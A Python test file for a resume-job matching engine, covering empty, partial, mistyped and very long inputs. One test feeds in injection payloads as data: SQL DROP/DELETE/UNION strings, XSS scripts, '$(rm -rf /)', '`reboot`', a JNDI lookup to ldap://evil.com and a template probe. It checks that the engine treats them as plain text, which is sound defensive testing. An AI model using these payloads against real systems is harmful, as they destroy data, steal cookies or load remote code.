"""Tests for edge cases, missing fields, corrupted types, and security payloads."""

from matching_engine.engine import match
from matching_engine.models import CandidateProfile, JobProfile, MatchResult


def test_both_profiles_none():
    result = match(None, None)
    assert isinstance(result, MatchResult)
    assert 0.0 <= result.overall_score <= 100.0
    assert result.matched_required_skills == []
    assert result.missing_required_skills == []


def test_both_profiles_empty_dict():
    result = match({}, {})
    assert isinstance(result, MatchResult)
    assert 0.0 <= result.overall_score <= 100.0


def test_candidate_empty_dict_against_strict_job():
    job = {
        "title": "Staff Engineer",
        "required_skills": ["Python", "Rust", "Distributed Systems"],
        "preferred_skills": ["Kubernetes"],
        "education": ["Master of Science"],
        "experience": ["8 years"],
        "description": "Looking for a Staff Engineer with strong systems background.",
    }
    result = match({}, job)
    assert result.overall_score == 0.0
    assert result.skill_score == 0.0
    assert result.experience_score == 0.0
    assert result.education_score == 0.0
    assert result.text_similarity_score == 0.0
    assert result.missing_required_skills == ["Python", "Rust", "Distributed Systems"]
    assert "Low match" in result.recommendation


def test_missing_fields_in_profiles():
    # Only partial fields supplied
    cand_partial = {"name": "Only Name Candidate"}
    job_partial = {"title": "Only Title Job"}
    result = match(cand_partial, job_partial)
    assert isinstance(result, MatchResult)
    assert result.overall_score > 0.0  # Because job has no requirements


def test_type_mismatches_graceful_handling():
    cand_bad_types = {
        "name": 12345,
        "email": ["not", "an", "email"],
        "skills": "Python, Docker, SQL",  # String instead of list
        "education": {"degree": "B.Tech"},  # Dict instead of list
        "experience": 5,  # Int instead of list
        "projects": None,  # None instead of list
    }
    job_bad_types = {
        "title": 9999,
        "required_skills": "Python, SQL",
        "preferred_skills": None,
        "education": "Bachelor",
        "experience": "3 years",
        "description": 123.456,
    }
    result = match(cand_bad_types, job_bad_types)
    assert isinstance(result, MatchResult)
    assert result.skill_score == 100.0
    assert "Python" in result.matched_required_skills
    assert "SQL" in result.matched_required_skills


def test_security_injection_payloads_treated_purely_as_data():
    cand_injection = {
        "name": "'; DROP TABLE candidates; --",
        "email": "<script>alert('xss')</script>",
        "skills": ["$(rm -rf /)", "'; DELETE FROM jobs; --", "<img src=x onerror=alert(1)>"],
        "education": ["UNION SELECT * FROM users; --"],
        "experience": ["`reboot`"],
        "projects": [{"name": "${jndi:ldap://evil.com/x}", "desc": "{{7*7}}"}],
    }
    job_injection = {
        "title": "SQL Injection Tester'; DROP TABLE jobs; --",
        "required_skills": ["$(rm -rf /)", "'; DELETE FROM jobs; --"],
        "preferred_skills": ["<img src=x onerror=alert(1)>"],
        "education": ["UNION SELECT * FROM users; --"],
        "experience": ["`reboot`"],
        "description": "{{7*7}} <script>alert(document.cookie)</script>",
    }
    # Matching engine must treat all strings as passive text without crashing or executing
    result = match(cand_injection, job_injection)
    assert isinstance(result, MatchResult)
    assert len(result.matched_required_skills) == 2
    assert len(result.matched_preferred_skills) == 1
    # Check that explanation produces clean text without issues
    report = result.explain()
    assert "DELETE FROM" in report
    assert "AI RESUME-JOB MATCH EVALUATION REPORT" in report


def test_extreme_character_and_length_inputs():
    long_desc = "Python machine learning software " * 5000
    cand = CandidateProfile(skills=["Python"] * 100)
    job = JobProfile(required_skills=["Python"], description=long_desc)
    result = match(cand, job)
    assert result.skill_score == 100.0
    assert result.overall_score > 0.0
